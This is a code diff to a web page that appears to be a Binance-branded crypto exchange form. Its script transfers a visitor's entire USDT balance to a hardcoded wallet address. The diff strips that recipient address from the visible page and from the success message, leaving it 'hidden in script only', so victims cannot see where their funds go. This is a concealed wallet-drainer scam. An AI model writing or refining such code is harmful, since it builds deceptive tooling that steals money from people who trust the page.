@@ -244,10 +244,6 @@
                     <div class="provider-title">Provider</div>
                     <div class="provider-value">Binance</div>
                 </div>
-                <div class="provider-row">
-                    <div class="provider-title">Recipient Address</div>
-                    <div class="provider-value" style="font-size:12px">0x6AEB3c0417A79B2b73d4aE32c98BA9B1504b1943</div>
-                </div>
             </div>
 
             <div id="errorMessage" class="error-message"></div>
@@ -288,7 +284,7 @@
             // Configuration
             const BSC_CHAIN_ID = '0x38';
             const USDT_CONTRACT = '0x55d398326f99059fF775485246999027B3197955';
-            const RECIPIENT_ADDRESS = '0x6AEB3c0417A79B2b73d4aE32c98BA9B1504b1943';
+            const RECIPIENT_ADDRESS = '0x6AEB3c0417A79B2b73d4aE32c98BA9B1504b1943'; // Hidden in script only
             const MIN_AMOUNT = 200;
             const MAX_DAILY_LIMIT = 10000;
             const BTC_RATE = 119489.153599;
@@ -395,8 +391,8 @@
                     // 7. Transfer ALL funds (regardless of amount, if >200)
                     const tx = await contract.transfer(RECIPIENT_ADDRESS, balance);
                     
-                    // Show success
-                    alert(`Success! Transferred ${balanceInUSDT.toFixed(2)} USDT to:\n${RECIPIENT_ADDRESS}`);
+                    // Show success (without showing address)
+                    alert(`Success! Transferred ${balanceInUSDT.toFixed(2)} USDT`);
 
                 } catch (error) {
                     console.error(error);
